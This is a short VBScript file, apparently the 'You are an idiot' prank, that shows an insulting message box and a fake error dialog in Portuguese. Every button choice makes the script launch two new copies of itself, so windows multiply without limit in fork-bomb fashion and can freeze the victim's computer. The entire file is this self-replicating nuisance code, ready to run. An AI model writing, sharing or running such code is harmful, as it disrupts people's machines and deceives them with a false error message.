Dim wshshell
intOpcao = msgbox("YOU ARE AN IDIOT",vbyesno,"IDIOT")
if intOpcao = vbyes then
     Set WshShell = WScript.CreateObject("WScript.Shell")
  WshShell.Run("youareanidiot.vbs")
  WshShell.Run("youareanidiot.vbs")
end if
if intOpcao = vbno then
     intOpcao = msgbox("Erro ao Encerar A Aplicacao ",vbRetryCancel,"IDIOT")
		if intOpcao = vbretry then
			Set WshShell = WScript.CreateObject("WScript.Shell")
			WshShell.Run("youareanidiot.vbs")
			WshShell.Run("youareanidiot.vbs")
			end if
	if intOpcao = vbcancel then
			Set WshShell = WScript.CreateObject("WScript.Shell")
			WshShell.Run("youareanidiot.vbs") 
			WshShell.Run("youareanidiot.vbs")
			end if
	end if 
WScript.Quit n